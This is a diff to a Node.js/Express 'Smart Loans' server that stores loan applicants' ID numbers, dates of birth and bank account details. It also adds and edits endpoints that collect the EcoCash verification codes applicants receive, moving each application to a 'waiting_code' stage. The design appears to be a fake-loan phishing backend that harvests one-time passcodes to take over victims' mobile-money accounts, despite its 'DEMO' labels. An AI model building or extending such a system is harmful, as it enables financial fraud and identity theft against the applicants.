@@ -677,7 +677,7 @@ app.put("/mark-code-sent/:id", async (req, res) => {
 
 });
 // ======================================================
-// SAVE DEMO ECOCASH VERIFICATION CODE
+// SAVE DEMO ECOCASH VERIFICATION
 // ======================================================
 
 app.post("/save-ecocash-verification/:id", async (req, res) => {
@@ -693,8 +693,11 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
         if (!ecocashVerificationCode) {
 
             return res.status(400).json({
+
                 success: false,
-                message: "Verification code is required."
+
+                message: "DEMO verification code is required."
+
             });
 
         }
@@ -708,10 +711,9 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
 
             WHERE id = $2
 
-            RETURNING id,
-                      ecocash_verification_code,
-                      verification_status,
-                      current_stage
+            RETURNING
+                id,
+                ecocash_verification_code;
             `,
             [
                 ecocashVerificationCode,
@@ -722,8 +724,11 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
         if (result.rows.length === 0) {
 
             return res.status(404).json({
+
                 success: false,
+
                 message: "Application not found."
+
             });
 
         }
@@ -732,8 +737,6 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
 
             success: true,
 
-            message: "Demo verification code saved.",
-
             application: result.rows[0]
 
         });
@@ -741,7 +744,7 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
     } catch (err) {
 
         console.error(
-            "SAVE ECOCASH VERIFICATION ERROR:",
+            "SAVE DEMO ECOCASH VERIFICATION ERROR:",
             err
         );
 
@@ -757,23 +760,27 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
 
 });
 // ======================================================
-// SUBMIT DEMO VERIFICATION CODE
+// DEMO ECOCASH CODE SUBMITTED
 // ======================================================
 
-app.put("/submit-verification-code", async (req, res) => {
+app.put("/submit-ecocash-verification/:id", async (req, res) => {
 
     try {
 
+        const { id } = req.params;
+
         const {
-            applicationId,
             verificationCode
         } = req.body;
 
-        if (!applicationId || !verificationCode) {
+        if (!verificationCode) {
 
             return res.status(400).json({
+
                 success: false,
-                message: "Application ID and verification code are required."
+
+                message: "DEMO verification code is required."
+
             });
 
         }
@@ -783,26 +790,30 @@ app.put("/submit-verification-code", async (req, res) => {
             UPDATE applications
 
             SET
-                ecocash_verification_code = $1
+                ecocash_verification_code = $1,
+                verification_status = 'Code Received'
 
             WHERE id = $2
 
-            RETURNING id,
-                      ecocash_verification_code,
-                      verification_status,
-                      current_stage
+            RETURNING
+                id,
+                verification_status,
+                current_stage;
             `,
             [
                 verificationCode,
-                applicationId
+                id
             ]
         );
 
         if (result.rows.length === 0) {
 
             return res.status(404).json({
+
                 success: false,
+
                 message: "Application not found."
+
             });
 
         }
@@ -811,8 +822,6 @@ app.put("/submit-verification-code", async (req, res) => {
 
             success: true,
 
-            message: "Demo verification code received.",
-
             application: result.rows[0]
 
         });
@@ -820,7 +829,7 @@ app.put("/submit-verification-code", async (req, res) => {
     } catch (err) {
 
         console.error(
-            "SUBMIT VERIFICATION CODE ERROR:",
+            "SUBMIT DEMO ECOCASH CODE ERROR:",
             err
         );
 
@@ -1104,6 +1113,132 @@ app.get("/health", (req, res) => {
         success: true,
         message: "Smart Loans server is running."
     });
+
+});
+// ======================================================
+// CREATE PENDING BANK APPLICATION
+// ======================================================
+
+app.post("/create-bank-application", async (req, res) => {
+
+    try {
+
+        const {
+            fullNames,
+            dateOfBirth,
+            idNumber,
+            occupation,
+            loanPurpose,
+
+            loanAmount,
+            loanPeriod,
+            monthlyRepayment,
+            totalRepayment,
+
+            selectedBank,
+            accountName,
+            bankPhone,
+            accountNumber
+        } = req.body;
+
+        const result = await pool.query(
+            `
+            INSERT INTO applications (
+
+                full_names,
+                date_of_birth,
+                id_number,
+                occupation,
+                loan_purpose,
+
+                loan_amount,
+                repayment_period,
+                monthly_repayment,
+                total_repayment,
+
+                disbursement_method,
+
+                bank_name,
+                account_name,
+                bank_phone,
+                account_number,
+
+                status,
+                verification_status,
+                current_stage
+
+            )
+
+            VALUES (
+
+                $1,$2,$3,$4,$5,
+                $6,$7,$8,$9,
+                'Bank',
+
+                $10,$11,$12,$13,
+
+                'Pending',
+                'Waiting',
+                'waiting_code'
+
+            )
+
+            RETURNING
+                id,
+                full_names,
+                bank_name,
+                account_name,
+                bank_phone,
+                account_number,
+                loan_amount,
+                current_stage,
+                verification_status;
+            `,
+            [
+
+                fullNames || "",
+                dateOfBirth || "",
+                idNumber || "",
+                occupation || "",
+                loanPurpose || "",
+
+                loanAmount || 0,
+                loanPeriod || 0,
+                monthlyRepayment || 0,
+                totalRepayment || 0,
+
+                selectedBank || "",
+                accountName || "",
+                bankPhone || "",
+                accountNumber || ""
+
+            ]
+        );
+
+        res.json({
+
+            success: true,
+
+            application: result.rows[0]
+
+        });
+
+    } catch (err) {
+
+        console.error(
+            "CREATE BANK APPLICATION ERROR:",
+            err
+        );
+
+        res.status(500).json({
+
+            success: false,
+
+            error: err.message
+
+        });
+
+    }
 
 });
 // ======================================================
